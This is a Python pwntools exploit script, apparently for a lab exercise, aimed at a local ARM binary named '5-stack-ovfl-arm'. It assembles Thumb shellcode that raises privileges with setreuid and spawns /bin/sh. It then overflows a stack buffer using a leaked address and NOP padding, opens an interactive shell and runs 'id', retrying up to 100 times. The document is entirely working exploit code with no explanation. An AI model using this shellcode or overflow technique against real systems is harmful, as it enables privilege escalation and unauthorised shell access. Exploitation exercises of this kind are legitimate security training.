#!/usr/bin/env python3

from pwn import *
from pwn import asm, context, gdb, p32, process

context.arch = "arm"

# run this embedded shellcode
shellcode = asm(
    """
.code 32
add r3,pc,#1
bx r3
.code 16
movs r7,0x32
svc #1
mov r1,r0
movs r7,0x47
mov r1,r1
svc #1
adr r0,binsh
sub r1,r1
sub r2,r2
strb r2,[r0,#7]
movs r7,0x0b
svc #0x41
binsh: .ascii "/bin/shX"
""",
    arch="arm",
)

env = {"CODE": shellcode}

with open("shellcode.bin", "wb") as f:
    f.write(shellcode)


for i in range(100):
    try:
        io = process("./5-stack-ovfl-arm", env=env)
        r = io.recv()
        bufAddr = int(r.split(b":")[1].split(b"\n")[0], 16)
        payload = [shellcode, asm("nop") * ((88 - len(shellcode)) // 2), p32(bufAddr)]
        payload = b"".join(payload)

        print(f"buffer address = {bufAddr:x}")
        io.sendline(payload)
        io.interactive()
        print(io.recv())
        io.sendline(b"id")
        print(io.recv())
        break

    except Exception as e:
        print(type(e))
        continue

print(f"tried {i}")
